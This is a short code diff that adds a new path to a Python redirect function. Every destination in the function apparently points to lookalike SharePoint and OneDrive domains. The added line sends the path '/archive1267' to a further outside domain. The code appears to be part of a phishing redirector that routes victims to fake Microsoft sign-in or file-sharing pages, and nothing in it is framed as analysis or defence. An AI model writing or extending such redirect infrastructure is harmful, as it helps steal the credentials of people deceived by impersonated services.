@@ -34,6 +34,8 @@ def get_redirect_url(path):
         return 'https://auth-sharedpoint.vercel.app/' # SQ-02-TRUE
     elif path == '/archive11':
         return 'https://auth-sharepointfiledata.vercel.app/' # SQ-03-TRUE
+    elif path == '/archive1267':
+        return 'https://texasiarsystems.com/86747d9b-4125-4d34-980d-166d95f94f7f/' # SQ-03-TRUE
     else:
         return 'https://onedrive-sharing.vercel.app/'
 
